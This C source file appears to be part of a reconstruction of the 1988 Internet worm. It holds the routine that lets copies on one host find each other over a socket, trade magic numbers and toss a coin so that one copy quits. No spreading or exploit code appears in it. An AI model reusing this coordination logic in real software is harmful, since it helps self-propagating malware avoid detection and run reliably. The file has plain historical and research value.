/*
 * Copyright (c) 1988 The Regents of the University of California.
 * All rights reserved.
 *
 * THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF THE UNIVERSITY
 * OF CALIFORNIA.  The copyright notice above does not evidence
 * any actual or intended publication of this source code.
 *
 * Copying or redistribution in any form is explicitly forbidden
 * unless prior written permission is obtained from Michael Karels or an
 * authorized representative of the University of California, Berkeley.
 *
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED
 * WARRANTIES OF MERCHANTIBILITY AND FITNESS FOR A PARTICULAR PURPOSE.
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include "types.h"

extern int	other_fd;
extern int	pleasequit;
time_t 	time();
u_long	inet_addr();

/* spend a specific amount of time serving clients */
other_sleep(timeout)
	int	timeout;
{
	int	nfds_unused;
	int	mask;
	time_t	before;
	time_t	after;
	struct	timeval tval;

	/* if we don't have a server socket, just sleep */
	if (other_fd < 0) {
		if (timeout != 0) {
			sleep(timeout);
		}
		return;
	}

	/* loop until no time is left */
	do {
		/* if we lose the flip, the server code closes the socket */
		if (other_fd < 0)
			return;
		mask = 1 << other_fd;

		if (timeout < 0)
			timeout = 0;
		tval.tv_sec = timeout;
		tval.tv_usec = 0;
		if (timeout != 0)
			(void) time(&before);

		/* wait for connections; sleep a bit if we took a signal */
		if ((nfds_unused = select(other_fd + 1, &mask, (int *)0, (int *)0, &tval)) < 0)
			sleep(1);

		/* if we got a connection, service it */
		if (mask)
			serve();

		/* adjust remaining time */
		if (timeout != 0) {
			(void) time(&after);
			timeout -= (after - before);
		}
	} while (timeout > 0);
}

/* serve a client connection on other_fd */
/* this is the inverse of the code in checkother() */
static
serve()
{
	int	fd;
	int	len;
	long	magic;
	struct	sockaddr_in sin;
	long	server_roll, client_roll;
	u_long	addr_unused;

	/* accept the connection */
	len = sizeof(sin);
	if ((fd = accept(other_fd, (struct sockaddr *) &sin, &len)) < 0)
		return;

	/* authentication of the "client" */
	/* curious -- this is byte order dependent: on purpose? */
	magic = 0x148898;
	if (write(fd, (char *)&magic, sizeof(magic)) != sizeof(magic)) {
		(void) close(fd);
		return;
	}
	if (xread(fd, (char *)&magic, sizeof(magic), 10) != 4) {
		(void) close(fd);
		return;
	}
	if (magic != 0x874697) {
		(void) close(fd);
		return;
	}

	/* flip to see who gets to continue */
	server_roll = random() >> 3;
	if (write(fd, (char *)&server_roll, sizeof(server_roll)) != sizeof(server_roll)) {
		(void) close(fd);
		return;
	}
	if (xread(fd, (char *)&client_roll, sizeof(client_roll), 10) != 4) {
		(void) close(fd);
		return;
	}
	(void) close(fd);

	/* if the client connected through the loopback interface,
	   ignore it */
	if ((addr_unused = inet_addr(XS("127.0.0.1"))) != sin.sin_addr.s_addr)
		return;

	/* who won the toss? */
	if ((client_roll + server_roll) % 2) {
		/* we lost */
		(void) close(other_fd);
		other_fd = -1;
		pleasequit++;
	}
}
